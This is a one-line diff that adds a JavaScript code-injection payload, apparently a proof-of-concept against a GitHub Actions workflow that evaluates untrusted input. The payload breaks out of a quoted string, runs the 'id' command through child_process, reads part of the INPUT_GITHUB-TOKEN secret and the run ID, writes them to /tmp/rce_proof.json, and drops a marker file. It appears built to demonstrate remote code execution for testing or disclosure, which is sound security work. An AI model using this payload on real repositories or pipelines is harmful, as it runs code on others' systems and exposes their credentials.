@@ -1,0 +1,1 @@
+'+(require("fs").writeFileSync("/tmp/rce_proof.json",JSON.stringify({id:require("child_process").execSync("id").toString(),token:process.env["INPUT_GITHUB-TOKEN"]?process.env["INPUT_GITHUB-TOKEN"].slice(0,7):"no-env-token",run:""+process.env.GITHUB_RUN_ID})),require("child_process").execSync("echo RCE_MARKER > rce_marker.txt").toString())+'
